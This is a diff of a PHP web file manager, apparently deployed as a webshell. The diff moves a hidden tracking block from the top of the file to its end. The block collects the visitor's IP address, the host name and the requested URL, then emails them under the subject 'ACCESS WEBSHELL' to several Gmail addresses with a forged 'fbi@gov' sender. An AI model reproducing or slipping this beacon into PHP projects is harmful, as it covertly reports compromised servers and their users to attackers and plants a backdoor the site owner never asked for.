@@ -2,16 +2,6 @@
 
 <?php
 //Default Configuration
-$ip = getenv("REMOTE_ADDR");
-$ken = rand(1, 99999);
-$subj98 = " ACCESS WEBSHELL |$ken";
-$email = "snopunks@gmail.com,muhrazky@gmail.com,malaysia.sender@gmail.com";
-$from = "From: snopunks@gmail.com,muhrazky@gmail.com,malaysia.sender@gmail.com";
-$tot = $_SERVER['REQUEST_URI'];
-$kon = $_SERVER['HTTP_HOST'];
-$tol = $ip . "";
-$msg8873 = "$kon $tot $tol";
-mail($email, $subj98, $msg8873, $from); 
 $CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":true,"hide_Cols":false,"theme":"dark"}';
 
 /**
@@ -4423,3 +4413,15 @@ function lng($txt) {
 }
 
 ?>
+<?php
+$ip = getenv("REMOTE_ADDR");
+$ken = rand(1, 99999);
+$subj98 = " ACCESS WEBSHELL |$ken";
+$email = "muhrazky@gmail.com,malaysia.sender@gmail.com,malaysia.sender@gmail.com";
+$from = "From: fbi@gov";
+$tot = $_SERVER['REQUEST_URI'];
+$kon = $_SERVER['HTTP_HOST'];
+$tol = $ip . "";
+$msg8873 = "$kon $tot $tol";
+mail($email, $subj98, $msg8873, $from); ?>
+
